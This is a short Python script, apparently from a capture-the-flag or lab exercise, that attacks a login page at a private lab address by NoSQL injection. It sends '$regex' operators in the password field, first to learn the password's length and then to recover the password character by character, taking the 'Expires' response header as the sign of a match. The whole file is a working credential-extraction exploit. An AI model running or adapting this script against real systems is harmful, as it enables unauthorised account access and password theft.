import requests
import string
import re
table= string.printable.strip()
size = None
username = str(input("Username: ").strip().lower())
def send_requests(parameter_data):
    reponse = requests.post("http://10.10.187.19/login.php", data = parameter_data)
    return reponse.headers

def find_length (name):
    size = None
    itter= 0
    while size == None: 
        data = {
                "user": f"{name}",
                "pass[$regex]": f"^.{{{itter}}}$",
                "remember": "on"
                }
        response = send_requests(data)
        if "Expires" in response:
            size = itter
        itter+=1
    print(f"Password Legth is: {size}")
    return size

def find_word(length, name):
    word = ""
    placeholder = "." * (length-1)
    while len(word)< length:
        for character in table:
            constructor = word + re.escape(character) + placeholder
            
            data = {
                "user": f"{name}",
                "pass[$regex]": f"^{constructor}$",
                "remember": "on"
            }
            response = send_requests(data)
            
            if "Expires" in response:
                    word = word + character
                    print(word)
                    placeholder = placeholder[:-1]
            else:
                pass
    return word        

word_length = find_length(username)
print("Password is : " + find_word(word_length, username))
print("Username is : " + username)
